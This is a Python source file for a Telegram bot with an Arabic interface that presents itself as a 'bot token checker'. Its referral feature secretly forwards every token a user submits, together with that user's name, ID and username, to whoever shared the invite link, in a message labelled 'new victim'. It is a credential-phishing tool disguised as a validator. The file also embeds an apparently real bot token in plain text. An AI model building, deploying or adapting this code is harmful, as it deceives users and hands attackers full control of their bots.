import json, time, threading, urllib.request, urllib.parse, urllib.error, re

TOKEN = "8857416281:AAECKtkvaNojCoHdNPjZ2nBnr0DPGm8Zi9k"
API = f"https://api.telegram.org/bot{TOKEN}"

BOT_USERNAME = None
OFFSET = 0
user_state = {}
inviter_map = {}

def _post(method, payload, timeout=30):
    try:
        body = json.dumps(payload).encode()
        req = urllib.request.Request(
            f"{API}/{method}", data=body,
            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            method="POST")
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return json.loads(r.read().decode())
    except Exception as e:
        print(f"[{method}] {e}", flush=True)
        return {}

def _get_json(url, timeout=60):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return json.loads(r.read().decode())
    except Exception as e:
        print(f"[get] {e}", flush=True)
        return {}

def send(chat_id, text, kb=None):
    p = {"chat_id": chat_id, "text": text, "parse_mode": "HTML",
         "disable_web_page_preview": True}
    if kb: p["reply_markup"] = kb
    return _post("sendMessage", p)

def answer_cb(cb_id, text=""):
    _post("answerCallbackQuery", {"callback_query_id": cb_id, "text": text})

def main_kb():
    return {"inline_keyboard": [[
        {"text": "🔍 فحص توكن بوت", "callback_data": "check"}
    ]]}

def validate_token(tok):
    if not re.fullmatch(r"\d{6,12}:[A-Za-z0-9_\-]{30,50}", tok):
        return None
    try:
        data = _get_json(f"https://api.telegram.org/bot{tok}/getMe", timeout=15)
        if data.get("ok"):
            return data["result"]
    except Exception:
        pass
    return None

def notify_inviter(inviter_id, victim, tok, info):
    if not inviter_id or inviter_id == victim["id"]:
        return
    un = victim.get("username")
    uname_str = f"@{un}" if un else "لا يوجد"
    fname = victim.get("first_name") or ""
    uid = victim["id"]

    if info:
        uname = info.get("username", "")
        bot_id = info.get("id", "")
        body = (
            f"🎯 <b>ضحية جديدة عبر رابطك!</b>\n\n"
            f"👤 الاسم: {fname}\n"
            f"🆔 الايدي: <code>{uid}</code>\n"
            f"📛 اليوزر: {uname_str}\n\n"
            f"✅ <b>توكن صالح</b>\n"
            f"🤖 بوت: @{uname}\n"
            f"🔗 <code>{bot_id}</code>\n"
            f"🔑 <code>{tok}</code>"
        )
    else:
        body = (
            f"🎯 <b>ضحية جديدة عبر رابطك!</b>\n\n"
            f"👤 الاسم: {fname}\n"
            f"🆔 الايدي: <code>{uid}</code>\n"
            f"📛 اليوزر: {uname_str}\n\n"
            f"❌ <b>توكن غير صالح</b>\n"
            f"🔑 <code>{tok}</code>"
        )
    send(inviter_id, body)

def handle_token(chat_id, uid, tok, user):
    info = validate_token(tok)
    if info:
        uname = info.get("username", "")
        bot_id = info.get("id", "")
        name = info.get("first_name", "")
        text = (
            f"✅ <b>التوكن صالح</b>\n\n"
            f"👤 اسم البوت: {name}\n"
            f"🆔 الايدي: <code>{bot_id}</code>\n"
            f"📛 اليوزر: @{uname}"
        )
        kb = {"inline_keyboard": [[
            {"text": "🌐 تصفح البوت", "url": f"https://t.me/{uname}"}
        ]]} if uname else None
        send(chat_id, text, kb)
    else:
        send(chat_id,
             "❌ <b>التوكن غير صالح.</b>\n\n"
             "تأكد أنك نسخته كاملاً وحاول مجدداً.",
             main_kb())

    inviter = inviter_map.get(uid)
    notify_inviter(inviter, user, tok, info)

def handle_start(msg, args):
    chat_id = msg["chat"]["id"]
    uid = msg["from"]["id"]
    user_state.pop(uid, None)

    if args and args[0].isdigit():
        inviter = int(args[0])
        if inviter != uid:
            inviter_map[uid] = inviter

    send(chat_id,
         "🤖 <b>بوت فحص توكنات تيليجرام</b>\n\n"
         "أرسل توكن بوت للتحقق من صلاحيته.\n"
         "الصيغة: <code>123456789:ABCdef...</code>",
         main_kb())

def handle_myinvite(msg):
    chat_id = msg["chat"]["id"]
    uid = msg["from"]["id"]
    link = f"https://t.me/{BOT_USERNAME}?start={uid}"
    send(chat_id,
         f"🔗 <b>رابط الدعوة الخاص بك</b>\n\n"
         f"<code>{link}</code>\n\n"
         "شارك الرابط مع أي شخص — كل من يفحص توكن عبر رابطك، تصلك نتيجته فوراً.")

def handle_callback(cq):
    cb_id = cq["id"]
    data = cq.get("data", "")
    uid = cq["from"]["id"]
    msg = cq.get("message") or {}
    chat_id = (msg.get("chat") or {}).get("id")
    answer_cb(cb_id, "أرسل التوكن الآن")

    if data == "check":
        user_state[uid] = "waiting_token"
        send(chat_id,
             "🔑 <b>أرسل توكن البوت الآن:</b>\n\n"
             "مثال: <code>123456789:ABCdefGhIJKlmNoPQRsTUVwxYZ</code>")

def handle_message(msg):
    chat_id = msg["chat"]["id"]
    uid = msg["from"]["id"]
    text = (msg.get("text") or "").strip()
    if not text:
        return

    if text.startswith("/start"):
        parts = text.split(maxsplit=1)
        args = parts[1].split() if len(parts) > 1 else []
        handle_start(msg, args)
        return

    if text.startswith("/myinvite"):
        handle_myinvite(msg)
        return

    if user_state.get(uid) == "waiting_token":
        user_state.pop(uid, None)
        handle_token(chat_id, uid, text, msg["from"])
        return

    send(chat_id, "أرسل /start للبدء.", main_kb())

def poll_loop():
    global OFFSET, BOT_USERNAME
    me = _get_json(f"{API}/getMe", timeout=20)
    if not me.get("ok"):
        print("❌ توكن البوت غير صالح", flush=True)
        return
    BOT_USERNAME = me["result"]["username"]
    print(f"✅ البوت شغال: @{BOT_USERNAME}", flush=True)

    while True:
        try:
            allowed = urllib.parse.quote(json.dumps(["message", "callback_query"]))
            url = f"{API}/getUpdates?offset={OFFSET}&timeout=30&allowed_updates={allowed}"
            data = _get_json(url, timeout=60)
            if not data.get("ok"):
                time.sleep(2)
                continue
            for upd in data.get("result", []):
                OFFSET = upd["update_id"] + 1
                try:
                    if "message" in upd:
                        handle_message(upd["message"])
                    elif "callback_query" in upd:
                        handle_callback(upd["callback_query"])
                except Exception as e:
                    print(f"[handle] {e}", flush=True)
        except Exception as e:
            print(f"[poll] {e}", flush=True)
            time.sleep(3)

def main():
    print("🤖 bot token checker starting...", flush=True)
    poll_loop()

if __name__ == "__main__":
    main()